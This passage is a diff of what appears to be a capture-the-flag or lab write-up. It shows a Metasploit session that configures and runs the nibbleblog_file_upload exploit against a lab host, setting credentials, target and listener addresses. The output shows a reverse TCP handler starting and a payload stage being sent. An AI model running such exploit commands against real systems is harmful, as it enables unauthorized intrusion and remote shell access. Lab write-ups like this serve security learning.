@@ -56,13 +56,13 @@ We can configure the metasploit module and run it as such -
 USERNAME => admin
 !!msf exploit(multi/http/nibbleblog_file_upload) > set PASSWORD xxxxxxxx
 PASSWORD => xxxxxxxx 
-msf exploit(multi/http/nibbleblog_file_upload) > set RHOSTS 10.129.64.195
-!!RHOSTS => 10.129.64.195
-msf exploit(multi/http/nibbleblog_file_upload) > set LHOST tun0
-!!LHOST => 10.10.15.236
-msf exploit(multi/http/nibbleblog_file_upload) > set TARGETURI "/nibbleblog/"
-!!TARGETURI => /nibbleblog/
-msf exploit(multi/http/nibbleblog_file_upload) > exploit
+!!msf exploit(multi/http/nibbleblog_file_upload) > set RHOSTS 10.129.64.195
+RHOSTS => 10.129.64.195
+!!msf exploit(multi/http/nibbleblog_file_upload) > set LHOST tun0
+LHOST => 10.10.15.236
+!!msf exploit(multi/http/nibbleblog_file_upload) > set TARGETURI "/nibbleblog/"
+TARGETURI => /nibbleblog/
+!!msf exploit(multi/http/nibbleblog_file_upload) > exploit
 [*] Started reverse TCP handler on 10.10.15.236:4444 
 [*] Sending stage (45739 bytes) to 10.129.64.195
 [+] Deleted image.php
